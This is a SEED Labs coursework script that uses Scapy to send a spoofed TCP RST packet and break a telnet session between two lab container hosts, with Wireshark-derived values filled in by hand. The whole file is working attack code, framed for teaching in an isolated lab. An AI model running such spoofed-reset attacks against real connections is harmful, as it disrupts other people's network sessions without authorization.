#!/usr/bin/env python3
"""
Task 2: TCP RST Attack on telnet Connections (Manual)
SEED Labs - TCP/IP Attack Lab

This script sends a spoofed TCP RST packet to break an existing telnet
connection between two hosts.  All values (src IP, dst IP, ports, seq)
must be obtained from Wireshark before running.

INSTRUCTIONS:
1. Start Wireshark and capture on br-983f4e838608
2. Establish a telnet session from user1 (10.9.0.6) to victim (10.9.0.5)
3. Observe a packet from client to server and note:
   - SRC_IP: Source IP address (client)
   - DST_IP: Destination IP address (server)
   - SPORT: Source port (client port) 
   - DPORT: Destination port (23 for telnet)
   - SEQ: Sequence number from the packet you observe
4. Fill in the values below
5. Run: sudo python3 rst_attack.py

Usage:
    sudo python3 rst_attack.py
"""

from scapy.all import *

# ------------------------------------------------------------------
# Fill in these values from Wireshark before running the script.
# ------------------------------------------------------------------
SRC_IP   = "10.9.0.6"   # telnet client IP
DST_IP   = "10.9.0.5"   # telnet server IP
SPORT    = 12345         # client-side source port (from Wireshark)
DPORT    = 23            # telnet destination port
SEQ      = 0             # sequence number (from Wireshark)
# ------------------------------------------------------------------

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="R", seq=SEQ)
pkt = ip / tcp

print("[*] Sending RST packet...")
print(f"    Source: {SRC_IP}:{SPORT}")
print(f"    Destination: {DST_IP}:{DPORT}")
print(f"    Sequence: {SEQ}")
ls(pkt)
send(pkt, verbose=0)
print("[+] RST packet sent – telnet session should now be terminated.")
